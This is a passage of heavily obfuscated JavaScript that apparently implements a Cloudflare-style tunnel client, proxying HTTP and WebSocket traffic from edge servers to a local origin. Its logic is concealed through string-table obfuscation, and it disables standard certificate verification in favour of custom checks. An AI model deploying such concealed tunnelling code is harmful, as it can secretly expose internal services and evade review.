            this[gy(0x215)][gy(0x8dd)](c[gy(0xcb7)](gy(0x10b), a) + '\x20proxy\x20failed:\x20' + q);
            try {
                this[gy(0x9cc)](a, [[
                        c[gy(0xc87)],
                        c['fdcIf']
                    ]], !![]);
            } catch (r) {
            }
        }
    }
    async [a0ch(0x668)]() {
        const gz = a0ch, a = {
                'XXmzf': gz(0x2ea),
                'IApvB': gz(0x47f),
                'jldQm': function (d, f) {
                    return d + f;
                },
                'xVoZL': function (d, f) {
                    return d === f;
                },
                'TSbFk': function (d, f) {
                    return d & f;
                },
                'tPSJg': function (d, f) {
                    return d % f;
                },
                'HsVnt': gz(0x705),
                'XfevI': function (d, f) {
                    return d < f;
                },
                'LLLBb': function (d, f) {
                    return d === f;
                },
                'MLfkr': function (d, f) {
                    return d - f;
                },
                'phyNA': function (d, f) {
                    return d <= f;
                },
                'YzpZl': function (d, f) {
                    return d === f;
                },
                'DTrsL': function (d, f) {
                    return d === f;
                },
                'CmTvK': function (d, f) {
                    return d === f;
                }
            }, b = await this['reader']['readExact'](0x18);
        if (!b[gz(0x45b)](Buffer['from'](a[gz(0x610)])))
            throw new Error(a[gz(0x3a1)]);
        const c = Buffer['alloc'](0x6);
        c[gz(0xb21)](0x3, 0x0), c[gz(0x295)](0x64, 0x2), this[gz(0xa3b)](0x4, 0x0, 0x0, c);
        this[gz(0x43a)] && !this[gz(0x7d5)]['printed'] && (process[gz(0xc53)]['write'](a['jldQm'](this['tunnelUrl'], '\x0a')), this[gz(0x7d5)][gz(0xa4e)] = !![]);
        try {
            while (!this[gz(0x727)]) {
                const [d, f, g, h] = await this[gz(0x30d)]();
                if (a[gz(0x399)](d, 0x4)) {
                    if (!a['TSbFk'](f, 0x1)) {
                        if (a[gz(0x86c)](h[gz(0xed)], 0x6))
                            throw new Error(a[gz(0xa02)]);
                        for (let i = 0x0; a[gz(0xbeb)](i, h[gz(0xed)]); i += 0x6) {
                            const j = h[gz(0x80d)](i), k = h['readUInt32BE'](a[gz(0xa1d)](i, 0x2));
                            if (a[gz(0x375)](j, 0x4)) {
                                const l = a[gz(0x6bf)](k, 0xffff);
                                for (const m of this['streamWindows']['keys']()) {
                                    this[gz(0x6d2)][gz(0xb80)](m, Math[gz(0x434)](0x0, a[gz(0xa1d)](this['streamWindows']['get'](m), l)));
                                }
                            } else
                                a[gz(0x375)](j, 0x5) && k >= 0x4000 && a['phyNA'](k, 0xffffff) && (this[gz(0x25e)] = k);
                        }
                        this[gz(0xa3b)](0x4, 0x1, 0x0);
                    }
                    continue;
                }
                if (a[gz(0x399)](d, 0x6)) {
                    !a[gz(0x7db)](f, 0x1) && this[gz(0xa3b)](0x6, 0x1, 0x0, h);
                    continue;
                }
                if (a['YzpZl'](d, 0x8)) {
                    if (h['length'] !== 0x4)
                        continue;
                    const n = a[gz(0x7db)](h['readUInt32BE'](0x0), 0x7fffffff);
                    g === 0x0 ? this[gz(0xc73)] += n : this[gz(0x6d2)][gz(0xb80)](g, a[gz(0xa1d)](this[gz(0x6d2)]['get'](g) ?? 0xffff, n));
                    this[gz(0x628)]();
                    continue;
                }
                if (a[gz(0x173)](d, 0x3)) {
                    this['streams'][gz(0xaa3)](g);
                    continue;
                }
                if (a[gz(0x98a)](d, 0x7))
                    break;
                if (d === 0x1) {
                    const o = await this['readHeaders'](f, g, h);
                    !this[gz(0x6d2)][gz(0x286)](g) && this[gz(0x6d2)]['set'](g, 0xffff);
                    this[gz(0xaa6)](g, f, o);
                    continue;
                }
                if (a['DTrsL'](d, 0x0)) {
                    this[gz(0x7aa)](g, f, h);
                    continue;
                }
            }
        } finally {
            this[gz(0x727)] = !![], this['_releaseWaiters']();
            for (const p of this[gz(0x4b0)][gz(0x5e4)]()) {
                p['websocketProxy'] && p[gz(0x903)][gz(0xb00)]();
            }
            try {
                this[gz(0xba5)][gz(0x3d8)]();
            } catch (q) {
            }
        }
    }
    [a0ch(0xaa6)](a, b, c) {
        const gA = a0ch, d = {
                'EFdai': function (i, j) {
                    return i & j;
                },
                'rmcph': gA(0x11f),
                'CIDqp': gA(0x86d),
                'bhwFZ': gA(0x8dc),
                'XwJFj': function (i, j) {
                    return i === j;
                },
                'pSMzE': gA(0x95f),
                'OsSgU': gA(0xcfe),
                'LkTzg': function (i, j) {
                    return i & j;
                }
            }, f = {};
        for (const [i, j] of c) {
            i['startsWith'](':') ? f[i] = j : f[i[gA(0xacd)]()] = j;
        }
        const g = (f[a0am] || '')[gA(0x40e)]()[gA(0xacd)]();
        if (g === a0an) {
            this[gA(0x212)](a);
            d[gA(0x3b1)](b, 0x1) && (this['control'][gA(0x5df)] = !![]);
            return;
        }
        const h = {
            'method': f[gA(0xaca)] || d['rmcph'],
            'path': f[d[gA(0xce2)]] || '/',
            'authority': f[d[gA(0x948)]] || '',
            'headers': c[gA(0x29a)](([k]) => !k[gA(0xc9b)](':')),
            'body': [],
            'upgrade': g,
            'websocket': d[gA(0x340)](g, gA(0xcfe)) || d[gA(0x340)]((f[d['pSMzE']] || '')[gA(0xacd)](), d[gA(0x6c3)]),
            'ended': Boolean(d['LkTzg'](b, 0x1)),
            'finished': ![]
        };
        this[gA(0x4b0)][gA(0xb80)](a, h);
        if (h['websocket'])
            h[gA(0x903)] = new a0aU(this, a, h, this['origin'], this[gA(0x215)]), h[gA(0x903)][gA(0xd0b)]();
        else
            h[gA(0x84e)] && this[gA(0xb9d)](a, h);
    }
    [a0ch(0x7aa)](a, b, c) {
        const gB = a0ch, d = {
                'JNRui': function (g, h) {
                    return g !== h;
                },
                'zsIGM': function (g, h) {
                    return g === h;
                },
                'yXjvP': function (g, h) {
                    return g & h;
                },
                'VsMhF': function (g, h) {
                    return g(h);
                },
                'zqkGB': function (g, h) {
                    return g & h;
                }
            };
        this['sendWindowUpdate'](0x0, c[gB(0xed)]), this[gB(0x70f)](a, c[gB(0xed)]);
        if (d[gB(0x31b)](this['control'], null) && d[gB(0x968)](this['control'][gB(0x73e)], a)) {
            this[gB(0x355)][gB(0xae2)](c);
            d['yXjvP'](b, 0x1) && (this['control'][gB(0x5df)] = !![]);
            return;
        }
        const f = this['streams'][gB(0x850)](a);
        if (d[gB(0x968)](f, undefined))
            return;
        if (d[gB(0x31b)](f[gB(0x903)], undefined)) {
            f[gB(0x903)][gB(0xae2)](c, d[gB(0xc26)](Boolean, d['yXjvP'](b, 0x1)));
            return;
        }
        c[gB(0xed)] && f[gB(0xae4)][gB(0x77f)](c), d[gB(0x361)](b, 0x1) && (f[gB(0x84e)] = !![], this['requestFinished'](a, f));
    }
}
class a0aU {
    constructor(a, b, c, d, f) {
        const gC = a0ch, g = { 'DypsC': '6|2|4|1|5|7|0|3|8' }, h = g[gC(0x26a)][gC(0xbb0)]('|');
        let i = 0x0;
        while (!![]) {
            switch (h[i++]) {
            case '0':
                this[gC(0x316)] = [];
                continue;
            case '1':
                this['origin'] = d;
                continue;
            case '2':
                this[gC(0x73e)] = b;
                continue;
            case '3':
                this[gC(0x727)] = ![];
                continue;
            case '4':
                this[gC(0x1df)] = c;
                continue;
            case '5':
                this[gC(0x215)] = f;
                continue;
            case '6':
                this[gC(0x205)] = a;
                continue;
            case '7':
                this[gC(0x8cf)] = [];
                continue;
            case '8':
                this[gC(0xba5)] = null;
                continue;
            }
            break;
        }
    }
    ['start']() {
        const gD = a0ch;
        this[gD(0x668)]()[gD(0x818)](() => {
        });
    }
    [a0ch(0xae2)](a, b = ![]) {
        const gE = a0ch;
        a['length'] && this['queue']['push'](a), b && this['queue'][gE(0x77f)](null), this[gE(0x987)]();
    }
    ['stop']() {
        const gF = a0ch, a = {
                'LwQio': function (b, c) {
                    return b !== c;
                }
            };
        if (this[gF(0x727)])
            return;
        this['stopped'] = !![], this[gF(0x987)]();
        if (a[gF(0x516)](this[gF(0xba5)], null))
            try {
                this['sock'][gF(0x3d8)]();
            } catch (b) {
            }
    }
    [a0ch(0x987)]() {
        const gG = a0ch, a = {
                'vgTAB': function (b) {
                    return b();
                }
            };
        for (const b of this[gG(0x316)]) {
            a[gG(0x72c)](b);
        }
        this['waiters'] = [];
    }
    async [a0ch(0x999)]() {
        const gH = a0ch;
        while (!this[gH(0x727)]) {
            if (this[gH(0x8cf)]['length'])
                return this['queue'][gH(0xaa5)]();
            await new Promise(a => this[gH(0x316)][gH(0x77f)](a));
        }
        return null;
    }
    async [a0ch(0x668)]() {
        const gI = a0ch, a = {
                'Fmlux': function (b, c) {
                    return b(c);
                },
                'JVQLa': function (b, c) {
                    return b === c;
                },
                'tlFTt': gI(0x36e),
                'wDjUD': gI(0x153),
                'POZYc': gI(0x8f1),
                'mlDfw': gI(0xd5f),
                'AsyVM': function (b, c) {
                    return b === c;
                },
                'ACLPT': function (b, c) {
                    return b === c;
                },
                'nZsgg': gI(0x244),
                'MTLwr': function (b, c) {
                    return b(c);
                },
                'dyUSK': function (b, c) {
                    return b === c;
                },
                'XMICL': gI(0xa7c),
                'OpGMs': gI(0xd5c),
                'WzWKN': 'cf-cloudflared-response-meta',
                'QdICo': gI(0x1ee),
                'ABkVP': function (b, c) {
                    return b + c;
                },
                'bRBsC': gI(0x6f2),
                'sUMbN': gI(0x570),
                'GDFoS': '502'
            };
        try {
            this[gI(0xba5)] = await a['Fmlux'](a0aW, this['origin']), this[gI(0x755)]();
            const b = await a[gI(0x8a0)](a0aZ, this[gI(0xba5)]), c = [], d = [];
            for (const [i, j] of b[gI(0x363)]) {
                const k = i[gI(0xacd)]();
                a[gI(0xad5)](k, a[gI(0x28e)]) && d[gI(0x77f)]([
                    k,
                    j
                ]);
                const l = k[gI(0xc9b)](a['wDjUD']) || k[gI(0xc9b)](a[gI(0x599)]) || k[gI(0xc9b)](a['mlDfw']) || k[gI(0xc9b)](':');
                (!l || a[gI(0x9ac)](k, gI(0x205)) || a['JVQLa'](k, gI(0x96e)) || a['ACLPT'](k, a[gI(0xce0)])) && c[gI(0x77f)]([
                    k,
                    j
                ]);
            }
            const f = a[gI(0x914)](a0aR, c), g = a[gI(0x97b)](b[gI(0x4dc)], 0x65) ? 0xc8 : b[gI(0x4dc)], h = [
                    [
                        a[gI(0xb7e)],
                        a[gI(0x8a0)](String, g)
                    ],
                    ...d,
                    [
                        a['OpGMs'],
                        f
                    ],
                    [
                        a[gI(0xcd9)],
                        a['QdICo']
                    ]
                ];
            this['connection'][gI(0x9cc)](this[gI(0x73e)], h), this[gI(0x310)]()[gI(0x818)](() => {
            }), await this['pumpOrigin'](b[gI(0xc98)]);
        } catch (m) {
            this['log']['warning'](a['ABkVP'](a[gI(0x1e3)], this[gI(0x73e)]) + a[gI(0x63c)] + m);
            try {
                this['connection']['sendHeaders'](this[gI(0x73e)], [[
                        gI(0xa7c),
                        a[gI(0xbba)]
                    ]], !![]);
            } catch (n) {
            }
        } finally {
            this['stop']();
        }
    }
    async [a0ch(0xc6b)](a) {
        const gJ = a0ch;
        a[gJ(0xed)] && await this[gJ(0x205)][gJ(0x2c9)](this['streamId'], a, ![]);
        for await (const b of this[gJ(0xba5)]) {
            if (this[gJ(0x727)])
                break;
            await this[gJ(0x205)]['sendData'](this[gJ(0x73e)], b, ![]);
        }
        !this[gJ(0x727)] && await this['connection']['sendData'](this[gJ(0x73e)], Buffer[gJ(0x9e7)](0x0), !![]);
    }
    async ['writeToOrigin']() {
        const gK = a0ch, a = {
                'SYeYR': function (b, c) {
                    return b === c;
                }
            };
        while (!this[gK(0x727)]) {
            const b = await this[gK(0x999)]();
            if (a['SYeYR'](b, null))
                return;
            try {
                this['sock'][gK(0x92a)](b);
            } catch (c) {
                this['stopped'] = !![];
                return;
            }
        }
    }
    [a0ch(0x755)]() {
        const gL = a0ch, a = {
                'vYIyT': function (i, j) {
                    return i + j;
                },
                'JpRWo': function (i, j) {
                    return i + j;
                },
                'EZiEg': function (i, j) {
                    return i + j;
                },
                'pviwh': gL(0x4be),
                'RZMvC': 'host',
                'eHwlj': function (i, j) {
                    return i === j;
                },
                'Yidyj': gL(0x205),
                'bWgIy': function (i, j) {
                    return i === j;
                },
                'Kgkhm': gL(0x96e),
                'cXoUU': gL(0x36e),
                'KbtDN': gL(0x91c),
                'CZIBI': 'sec-websocket-key',
                'Whyud': function (i, j) {
                    return i === j;
                },
                'UWVWP': 'sec-websocket-version',
                'qCVJN': 'origin',
                'rLxlf': function (i, j) {
                    return i + j;
                },
                'JLGrY': function (i, j) {
                    return i + j;
                },
                'UunMO': gL(0x58b),
                'grtqI': function (i, j) {
                    return i + j;
                },
                'SbAPN': gL(0x54c),
                'KyVEZ': gL(0x3e3),
                'TMmUy': gL(0xd18),
                'ANVuS': gL(0x6bd),
                'xnRqu': 'Connection:\x20Upgrade',
                'qeezO': gL(0x6ab),
                'KBryH': function (i, j) {
                    return i + j;
                },
                'Vpmzd': gL(0xc52)
            }, b = new URL(this[gL(0x85a)]), c = this['request'][gL(0x4ac)][gL(0xc9b)]('/') ? this[gL(0x1df)][gL(0x4ac)] : a[gL(0x3e1)]('/', this[gL(0x1df)]['path']), d = [a[gL(0xd27)](a['EZiEg'](a['pviwh'], c), gL(0x9b2))];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[gL(0x1df)]['headers']) {
            const k = i['toLowerCase']();
            if (k === a[gL(0x37d)] || a[gL(0x2d1)](k, a[gL(0x61b)]) || a[gL(0x5c5)](k, a[gL(0x576)]) || a[gL(0x5c5)](k, a[gL(0xd63)]) || k === a[gL(0x427)])
                continue;
            if (a['eHwlj'](k, a['CZIBI']))
                f = !![];
            else {
                if (a[gL(0x194)](k, a['UWVWP']))
                    g = !![];
                else
                    a[gL(0x2d1)](k, a[gL(0x18b)]) && (h = !![]);
            }
            d['push'](a['rLxlf'](i, ':\x20') + j);
        }
        d['push'](a[gL(0x27c)](a[gL(0x30f)], b['host'])), !h && this[gL(0x1df)][gL(0x891)] && d[gL(0x77f)](a['grtqI'](a['SbAPN'], this[gL(0x1df)]['authority'])), !f && d[gL(0x77f)](a[gL(0x3e1)](a[gL(0xa36)], a0k[gL(0x863)](0x10)[gL(0x1d9)](a[gL(0x4e7)]))), !g && d[gL(0x77f)](a[gL(0xcb6)]), d[gL(0x77f)](a['xnRqu']), d[gL(0x77f)](a['qeezO']), this[gL(0xba5)][gL(0x92a)](Buffer[gL(0x8c2)](a[gL(0x6dc)](d[gL(0xaa7)]('\x0d\x0a'), gL(0x902)), a[gL(0x791)]));
    }
}
class a0aV {
    constructor(a, b, c, d = {}) {
        const gM = a0ch, f = {
                'MTeXV': function (i, j) {
                    return i === j;
                }
            }, g = gM(0x367)[gM(0xbb0)]('|');
        let h = 0x0;
        while (!![]) {
            switch (g[h++]) {
            case '0':
                this[gM(0x215)] = c;
                continue;
            case '1':
                this[gM(0x4b3)] = f['MTeXV'](d[gM(0x7c7)], !![]);
                continue;
            case '2':
                this[gM(0x5df)] = ![];
                continue;
            case '3':
                this['streamId'] = b;
                continue;
            case '4':
                this[gM(0xc5e)] = Buffer[gM(0x9e7)](0x0);
                continue;
            case '5':
                this[gM(0x205)] = a;
                continue;
            }
            break;
        }
    }
    [a0ch(0xd0b)](a, b, c, d) {
        const gN = a0ch, f = {
                'rfllk': function (g, h, i, j, k, l, m) {
                    return g(h, i, j, k, l, m);
                }
            };
        this[gN(0x205)][gN(0x2c9)](this[gN(0x73e)], a0aC(0x0), ![]), this['connection'][gN(0x2c9)](this[gN(0x73e)], f['rfllk'](a0aD, 0x1, 0x0, a, b, c, d), ![]);
    }
    [a0ch(0xae2)](a) {
        const gO = a0ch, b = {
                'zBYAJ': function (f, g) {
                    return f(g);
                },
                'IqABv': function (f, g) {
                    return f + g;
                },
                'fkkjY': gO(0xa0a),
                'IEskp': function (f, g) {
                    return f + g;
                },
                'tWrDn': gO(0x597),
                'zYCHH': function (f, g) {
                    return f + g;
                },
                'UeWnh': gO(0x58f)
            };
        this[gO(0xc5e)] = this['buffer'][gO(0xed)] ? Buffer[gO(0x653)]([
            this[gO(0xc5e)],
            a
        ]) : a;
        let c, d;
        [c, d] = a0aE(this[gO(0xc5e)]), this[gO(0xc5e)] = d;
        for (const f of c) {
            try {
                const g = b[gO(0xcf2)](a0aJ, f);
                if (g['bootstrap'])
                    continue;
                g['ok'] ? (this[gO(0x215)][gO(0x1b1)](b[gO(0x929)](gO(0x48b), g['location'] || b[gO(0x25b)])), this[gO(0x205)][gO(0x103)] = !![]) : (this['log']['warning'](b[gO(0x178)](gO(0x7b2), g[gO(0xb4f)] || b[gO(0x4bf)])), this['connection'][gO(0x554)] = !![], this[gO(0x205)]['stopped'] = !![]);
            } catch (h) {
                this['log'][gO(0x4f6)](b[gO(0x55a)](b[gO(0x413)], h));
            }
        }
    }
}
function a0aW(a) {
    const gP = a0ch, b = {
            'ddmnB': 'error',
            'oPIEd': function (c, d) {
                return c(d);
            },
            'PigxU': function (c, d, f) {
                return c(d, f);
            },
            'ckFYr': 'secureConnect',
            'wJOKX': function (c, d, f) {
                return c(d, f);
            },
            'LXJkS': gP(0x784),
            'Cdqgf': gP(0x604),
            'NKRre': function (c, d) {
                return c === d;
            }
        };
    return new Promise((c, d) => {
        const gR = gP, f = {
                'YcEsf': function (n, o, p) {
                    const gQ = a0b;
                    return b[gQ(0xb7d)](n, o, p);
                }
            };
        let g;
        try {
            g = new URL(a);
        } catch (n) {
            b[gR(0x745)](d, new Error(b[gR(0x488)]));
            return;
        }
        if (![
                gR(0x772),
                b[gR(0x508)]
            ][gR(0x659)](g[gR(0x711)]) || !g['hostname']) {
            d(new Error(gR(0x784)));
            return;
        }
        const h = b[gR(0x7ef)](g[gR(0x711)], b['Cdqgf']), i = g[gR(0xae3)] || (h ? 0x1bb : 0x50), j = a0i[gR(0x368)]({
                'host': g['hostname'],
                'port': i
            });
        let k = ![];
        const l = (o, p) => {
                const gS = gR;
                if (k)
                    return;
                k = !![], j[gS(0x846)](b[gS(0xc54)], m), j['setTimeout'](0x0), b['oPIEd'](o, p);
            }, m = o => {
                !k && f['YcEsf'](l, d, o);
            };
        j['on'](b['ddmnB'], m), j[gR(0x7da)](0x7530, () => j[gR(0x3d8)](new Error(gR(0xab7)))), j['on'](gR(0x368), () => {
            const gU = gR, o = {
                    'JAkkN': function (q, r, s) {
                        const gT = a0b;
                        return b[gT(0x3a8)](q, r, s);
                    }
                };
            if (!h) {
                b[gU(0x3a8)](l, c, j);
                return;
            }
            const p = a0j[gU(0x368)]({
                'socket': j,
                'servername': g[gU(0xa56)]
            });
            p['on'](b['ddmnB'], q => {
                const gV = gU;
                !k && f[gV(0x575)](l, d, q);
            }), p['on'](b[gU(0x507)], () => {
                const gW = gU;
                o[gW(0x2d5)](l, c, p);
            });
        });
    });
}
function a0aX(a) {
    const gX = a0ch, b = {
            'qHJQq': function (d, f) {
                return d < f;
            },
            'CDidB': function (d, f) {
                return d + f;
            }
        }, c = [];
    for (let d = 0x0; b[gX(0x327)](d, a[gX(0x9e9)][gX(0xed)]); d += 0x2) {
        c[gX(0x77f)]([
            a[gX(0x9e9)][d],
            a[gX(0x9e9)][b[gX(0x479)](d, 0x1)]
        ]);
    }
    return c;
}
function a0aY(a, b, c, d, f) {
    const gY = a0ch, g = {
            'TmNFo': function (h, i) {
                return h(i);
            },
            'ystoh': gY(0x784),
            'QZzqm': gY(0x772),
            'pTYZk': gY(0x604),
            'hBsyw': function (h, i) {
                return h === i;
            },
            'uDlbY': gY(0xab4),
            'kvlec': function (h, i) {
                return h === i;
            },
            'ntGPZ': gY(0x91c),
            'LNGXk': gY(0x36e),
            'TWiNm': gY(0x5a4),
            'nocDo': 'error'
        };
    return new Promise((h, i) => {
        const gZ = gY, j = {
                'XYIeK': function (r, s) {
                    return g['TmNFo'](r, s);
                }
            };
        let k;
        try {
            k = new URL(a);
        } catch (r) {
            i(new Error(g[gZ(0x742)]));
            return;
        }
        if (![
                g['QZzqm'],
                g[gZ(0x407)]
            ][gZ(0x659)](k[gZ(0x711)]) || !k[gZ(0xa56)]) {
            i(new Error(g[gZ(0x742)]));
            return;
        }
        const l = g[gZ(0x2d9)](k['protocol'], gZ(0x604)), m = k[gZ(0xae3)] || (l ? 0x1bb : 0x50), n = {};
        for (const [s, t] of d) {
            const u = s['toLowerCase']();
            if (u === g['uDlbY'] || g[gZ(0x2d9)](u, gZ(0x205)) || g['kvlec'](u, g[gZ(0x990)]) || g['hBsyw'](u, g['LNGXk']))
                continue;
            n[s] = t;
        }
        n[gZ(0xc2f)] = k[gZ(0xab4)];
        f[gZ(0xed)] && (n[g[gZ(0xab6)]] = String(f[gZ(0xed)]));
        const o = c[gZ(0xc9b)]('/') ? c : '/' + c, p = l ? a0h : a0g, q = p[gZ(0x1df)]({
                'hostname': k[gZ(0xa56)],
                'port': m,
                'path': o,
                'method': b,
                'headers': n,
                'timeout': 0x7530
            }, v => {
                const h0 = gZ;
                h({
                    'status': v[h0(0xca6)],
                    'headers': j['XYIeK'](a0aX, v),
                    'body': v
                });
            });
        q['on'](g[gZ(0x2e9)], v => i(v)), q[gZ(0xa40)](f['length'] ? f : undefined);
    });
}
function a0aZ(a) {
    const h1 = a0ch, b = {
            'WcGoB': 'end',
            'XDXPf': 'close',
            'ihlUg': h1(0x902),
            'EmypY': function (c, d) {
                return c < d;
            },
            'gcxEY': function (c) {
                return c();
            },
            'AZmQU': h1(0xc52),
            'dOTIi': function (c, d, f) {
                return c(d, f);
            },
            'QuGVw': function (c, d) {
                return c(d);
            },
            'egOXD': 'malformed\x20HTTP/1.1\x20response\x20status',
            'cOmYf': function (c, d) {
                return c < d;
            },
            'aOzsg': function (c, d) {
                return c > d;
            },
            'TAiel': function (c, d) {
                return c + d;
            },
            'LuCOs': function (c, d) {
                return c(d);
            },
            'kIrat': function (c, d) {
                return c + d;
            },
            'OKaor': function (c) {
                return c();
            },
            'gwscv': 'data',
            'YGMwf': h1(0xb4f)
        };
    return new Promise((c, d) => {
        const h4 = h1, f = {
                'OQswq': function (l) {
                    const h2 = a0b;
                    return b[h2(0x949)](l);
                },
                'SqlJf': function (l) {
                    const h3 = a0b;
                    return b[h3(0xaaf)](l);
                }
            };
        let g = Buffer[h4(0x9e7)](0x0);
        const h = () => {
                const h5 = h4;
                a['removeListener'](h5(0x649), i), a[h5(0x846)](h5(0xb4f), j), a[h5(0x846)](b['WcGoB'], k), a[h5(0x846)](b[h5(0xb8f)], k);
            }, i = l => {
                const h6 = h4;
                g = g['length'] ? Buffer[h6(0x653)]([
                    g,
                    l
                ]) : l;
                const m = g[h6(0xfa)](b[h6(0x96a)]);
                if (b[h6(0xc91)](m, 0x0))
                    return;
                b[h6(0x949)](h);
                const n = g[h6(0x4b4)](0x0, m)[h6(0x1d9)](b[h6(0x95a)]), o = n[h6(0xbb0)]('\x0d\x0a'), p = o[0x0][h6(0xbb0)]('\x20'), q = b['dOTIi'](parseInt, p[0x1], 0xa);
                if (!Number['isInteger'](q)) {
                    b[h6(0x3d9)](d, new Error(b[h6(0x171)]));
                    return;
                }
                const r = [];
                for (let s = 0x1; b[h6(0x87f)](s, o[h6(0xed)]); s++) {
                    const t = o[s];
                    if (!t)
                        continue;
                    const u = t[h6(0xfa)](':');
                    b['aOzsg'](u, 0x0) && r[h6(0x77f)]([
                        t[h6(0x88a)](0x0, u)[h6(0x40e)](),
                        t[h6(0x88a)](b[h6(0xcbd)](u, 0x1))[h6(0x40e)]()
                    ]);
                }
                b[h6(0x6f4)](c, {
                    'status': q,
                    'headers': r,
                    'rest': g[h6(0x4b4)](b['kIrat'](m, 0x4))
                });
            }, j = l => {
                const h7 = h4;
                f[h7(0x9f2)](h), d(l);
            }, k = () => {
                const h8 = h4;
                f[h8(0xb4d)](h), d(new Error(h8(0xa68)));
            };
        a['on'](b['gwscv'], i), a['on'](b['YGMwf'], j), a['on'](h4(0xa40), k), a['on']('close', k);
    });
}
function a0b0(a) {
    const h9 = a0ch, b = {
            'BCDxX': h9(0xb7f),
            'fhKRX': function (f, g) {
                return f === g;
            },
            'LcsBP': h9(0x5b7),
            'tgJxR': function (f, g) {
                return f + g;
            },
            'OAjFA': h9(0x192),
            'RUKQm': function (f, g) {
                return f(g);
            },
            'dScnn': h9(0xd66),
            'XjBxJ': function (f, g) {
                return f !== g;
            },
            'LJYjr': h9(0x3f7),
            'kOPaF': h9(0x8b8)
        };
    if (!a || !a[h9(0xa52)])
        return h9(0x220);
    if (a[h9(0xa52)]['O'] !== h9(0xa17))
        return b[h9(0x594)](b[h9(0x37c)], a[h9(0xa52)]['O'] || '');
    if (!b[h9(0xc4e)](String, a[h9(0xa52)]['OU'] || '')[h9(0xc9b)](h9(0x4f0)))
        return b['tgJxR'](b['dScnn'], a['issuer']['OU'] || '');
    if (!a['subject'] || b['XjBxJ'](a['subject']['CN'], b[h9(0xbcf)]))
        return h9(0x1f4);
    const c = b[h9(0xc4e)](String, a[h9(0x206)] || '')[h9(0xbb0)](',')[h9(0x51f)](f => f['trim']()[h9(0xacd)]()), d = c['some'](f => {
            const ha = h9;
            if (!f[ha(0xc9b)](b[ha(0x840)]))
                return ![];
            const g = f[ha(0x88a)](0x4);
            return b[ha(0x139)](g, b[ha(0xa5a)]) || b['fhKRX'](g, ha(0x5d8)) || g[ha(0xc9b)]('*.') && b[ha(0xa5a)]['endsWith'](g[ha(0x88a)](0x1));
        });
    if (!d)
        return b['kOPaF'];
    return null;
}
function a0b1(a, b) {
    const hb = a0ch, c = {
            'mgjZZ': function (h, i) {
                return h + i;
            },
            'QgdIA': function (h, i) {
                return h !== i;
            },
            'QGsnb': hb(0x7d7),
            'NxQwJ': function (h, i) {
                return h > i;
            },
            'uLqRS': function (h, i) {
                return h + i;
            },
            'rscgL': hb(0x5b7),
            'XchQi': hb(0x3b4),
            'jLdui': function (h, i) {
                return h + i;
            },
            'gLbxY': 'edge\x20',
            'VdgCj': hb(0x570),
            'XwIUm': function (h, i) {
                return h + i;
            },
            'WFPUT': hb(0x2bf),
            'XPADR': function (h) {
                return h();
            }
        }, d = a0ak['slice']()['sort'](() => Math['random']() - 0.5);
    let f = null;
    const g = async () => {
        const he = hb, h = {
                'rEshP': function (i, j) {
                    return i(j);
                },
                'PgXiI': function (i, j) {
                    return c['mgjZZ'](i, j);
                },
                'UPdzi': function (i, j) {
                    return c['QgdIA'](i, j);
                },
                'tUUqp': c['QGsnb'],
                'YeaES': function (i, j) {
                    const hc = a0b;
                    return c[hc(0x561)](i, j);
                },
                'OvXhi': function (i, j) {
                    const hd = a0b;
                    return c[hd(0x842)](i, j);
                },
                'bCfay': c['rscgL'],
                'iblTK': c[he(0xb53)]
            };
        for (const i of d) {
            try {
                return await new Promise((j, k) => {
                    const hf = he, l = a0j['connect']({
                            'host': i,
                            'port': a0al,
                            'ALPNProtocols': ['h2'],
                            'servername': h[hf(0x225)],
                            'rejectUnauthorized': ![]
                        });
                    l[hf(0x7da)](0x2710, () => l[hf(0x3d8)](new Error('connection\x20timeout'))), l['on']('error', k), l['on'](h[hf(0x409)], () => {
                        const hg = hf;
                        if (a) {
                            const n = h[hg(0xcbc)](a0b0, l[hg(0x937)](![]));
                            if (n) {
                                l[hg(0x3d8)](new Error(h[hg(0x8d1)](hg(0x8ea), n)));
                                return;
                            }
                        }
                        const m = l[hg(0x412)];
                        if (m && h[hg(0x459)](m, 'h2')) {
                            l[hg(0x3d8)](new Error(h[hg(0x4de)]));
                            return;
                        }
                        h[hg(0x9eb)](a0c2, 0x0) ? l[hg(0x7da)](a0c2, () => l[hg(0x3d8)](new Error(hg(0x986)))) : l[hg(0x7da)](0x0), b[hg(0x1b1)](h[hg(0xb64)](h[hg(0xb64)](hg(0x8c1), i) + ':', a0al)), j(l);
                    });
                });
            } catch (j) {
                f = j, b[he(0x8dd)](c[he(0xc5f)](c[he(0x8ed)] + i, c[he(0xc55)]) + j);
            }
        }
        throw new Error(c[he(0x5bb)](c[he(0x419)], f));
    };
    return c[hb(0x519)](g);
}
const a0b2 = Buffer[a0ch(0x8c2)](a0ch(0xb98), a0ch(0x26f)), a0b3 = Buffer[a0ch(0x8c2)](a0ch(0x589), a0ch(0x26f)), a0b4 = Buffer['concat']([
        a0b2,
        Buffer['from']('01', a0ch(0xc52))
    ]), a0b5 = Buffer['concat']([
        a0b3,
        Buffer[a0ch(0x8c2)]('01', a0ch(0xc52))
    ]), a0b6 = {
        'http': 0x0,
        'websocket': 0x1,
        'tcp': 0x2
    }, a0b7 = 'HttpMethod', a0b8 = 'HttpHost', a0b9 = a0ch(0xc86), a0ba = 'HttpHeader', a0bb = 0x1, a0bc = a0ch(0x370), a0bd = 'quic.cftunnel.com', a0be = Buffer[a0ch(0x8c2)](a0ch(0x648), a0ch(0x26f)), a0bf = Buffer[a0ch(0x8c2)](a0ch(0xc07), a0ch(0x26f)), a0bg = 0x10, a0bh = 0x4, a0bi = 0x4d0, a0bj = 0x4b0, a0bk = 0x0, a0bl = 0x1, a0bm = 0x2, a0bn = [
        a0ch(0xa98),
        a0ch(0xa6b),
        a0ch(0xb9a)
    ], a0bo = {
        'padding': 0x0,
        'ping': 0x1,
        'ack': 0x2,
        'ackEcn': 0x3,
        'resetStream': 0x4,
        'stopSending': 0x5,
        'crypto': 0x6,
        'newToken': 0x7,
        'stream': 0x8,
        'maxData': 0x10,
        'maxStreamData': 0x11,
        'maxStreamsBidi': 0x12,
        'maxStreamsUni': 0x13,
        'newConnectionId': 0x18,
        'retireConnectionId': 0x19,
        'pathChallenge': 0x1a,
        'pathResponse': 0x1b,
        'transportClose': 0x1c,
        'applicationClose': 0x1d,
        'handshakeDone': 0x1e,
        'datagram': 0x30,
        'datagramLen': 0x31
    }, a0bp = {
        'originalDestinationConnectionId': 0x0,
        'maxIdleTimeout': 0x1,
        'statelessResetToken': 0x2,
        'maxUdpPayloadSize': 0x3,
